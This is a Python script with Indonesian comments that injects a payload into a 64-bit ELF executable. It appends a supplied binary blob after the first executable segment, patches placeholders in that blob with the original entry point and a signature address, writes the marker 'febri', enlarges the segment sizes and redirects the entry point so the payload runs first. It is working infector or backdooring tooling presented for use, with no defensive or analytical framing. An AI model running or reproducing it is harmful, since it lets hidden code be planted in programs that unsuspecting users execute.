import sys
import struct

def read_elf_header(f):
    f.seek(0)
    e_ident = f.read(16)
    if e_ident[:4] != b'\x7fELF':
        raise ValueError("Bukan file ELF")
    f.seek(24)
    e_entry = struct.unpack("<Q", f.read(8))[0]
    f.seek(32)
    e_phoff = struct.unpack("<Q", f.read(8))[0]
    f.seek(56)
    e_phnum = struct.unpack("<H", f.read(2))[0]
    return e_entry, e_phoff, e_phnum

def read_program_headers(f, e_phoff, e_phnum):
    phdrs = []
    f.seek(e_phoff)
    for i in range(e_phnum):
        data = f.read(56)
        p_type, p_flags = struct.unpack("<II", data[:8])
        p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align = struct.unpack("<QQQQQQ", data[8:])
        phdrs.append({
            "p_type": p_type,
            "p_flags": p_flags,
            "p_offset": p_offset,
            "p_vaddr": p_vaddr,
            "p_paddr": p_paddr,
            "p_filesz": p_filesz,
            "p_memsz": p_memsz,
            "p_align": p_align,
            "ph_offset": e_phoff + i*56,
        })
    return phdrs

def patch_payload(payload_data, new_entry, sig_addr):
    # Patch placeholder 0xBBBBBBBBBBBBBBBB dengan entry asli
    placeholder_entry = b"\xBB"*8
    idx_entry = payload_data.find(placeholder_entry)
    if idx_entry == -1:
        raise ValueError("Placeholder entry asli tidak ditemukan")
    patched = payload_data[:idx_entry] + struct.pack("<Q", new_entry) + payload_data[idx_entry+8:]

    # Patch placeholder 0xAAAAAAAAAAAAAAAA dengan alamat signature
    placeholder_sig = b"\xAA"*8
    idx_sig = patched.find(placeholder_sig)
    if idx_sig == -1:
        raise ValueError("Placeholder alamat signature tidak ditemukan")
    patched = patched[:idx_sig] + struct.pack("<Q", sig_addr) + patched[idx_sig+8:]
    return patched

def main(target_file, payload_file, output_file):
    with open(target_file, "rb") as f:
        elf_data = f.read()

    with open(target_file, "rb") as f:
        e_entry, e_phoff, e_phnum = read_elf_header(f)
        phdrs = read_program_headers(f, e_phoff, e_phnum)

    exec_phdr = None
    for ph in phdrs:
        if ph["p_type"] == 1 and (ph["p_flags"] & 1):
            exec_phdr = ph
            break

    if not exec_phdr:
        print("Segmen executable tidak ditemukan")
        sys.exit(1)

    with open(payload_file, "rb") as f:
        payload_data = f.read()

    # Hitung lokasi payload dan signature
    payload_offset = exec_phdr["p_offset"] + exec_phdr["p_filesz"]
    payload_vaddr = exec_phdr["p_vaddr"] + exec_phdr["p_memsz"]
    signature = b"febri"
    signature_offset = payload_offset + len(payload_data)
    signature_vaddr = payload_vaddr + len(payload_data)

    # Patch payload placeholder dengan alamat sebenarnya
    payload_patched = patch_payload(payload_data, e_entry, signature_vaddr)

    # Buat buffer baru dari ELF asli
    new_elf = bytearray(elf_data)

    # Sisipkan payload
    if payload_offset > len(new_elf):
        new_elf.extend(b'\x00' * (payload_offset - len(new_elf)))
    new_elf[payload_offset:payload_offset+len(payload_patched)] = payload_patched

    # Sisipkan signature tepat setelah payload
    sig_off = payload_offset + len(payload_patched)
    if sig_off > len(new_elf):
        new_elf.extend(b'\x00' * (sig_off - len(new_elf)))
    new_elf[sig_off:sig_off+len(signature)] = signature

    # Update ukuran segmen executable (file & mem)
    new_filesz = exec_phdr["p_filesz"] + len(payload_patched) + len(signature)
    new_memsz = exec_phdr["p_memsz"] + len(payload_patched) + len(signature)

    # Update entry point ELF
    new_e_entry = payload_vaddr

    # Patch e_entry
    new_elf[24:32] = struct.pack("<Q", new_e_entry)

    # Patch ukuran segmen executable
    ph_offset = exec_phdr["ph_offset"]
    new_elf[ph_offset+16:ph_offset+24] = struct.pack("<Q", new_filesz)
    new_elf[ph_offset+24:ph_offset+32] = struct.pack("<Q", new_memsz)

    with open(output_file, "wb") as f:
        f.write(new_elf)

    print(f"Payload offset file: 0x{payload_offset:x}")
    print(f"Payload virtual addr: 0x{payload_vaddr:x}")
    print(f"Signature offset file: 0x{signature_offset:x}")
    print(f"Signature virtual addr: 0x{signature_vaddr:x}")
    print(f"Original entry: 0x{e_entry:x}")
    print(f"New entry: 0x{new_e_entry:x}")
    print(f"Output saved to {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target_elf> <payload_bin> <output_elf>")
        sys.exit(1)
    main(sys.argv[1], sys.argv[2], sys.argv[3])
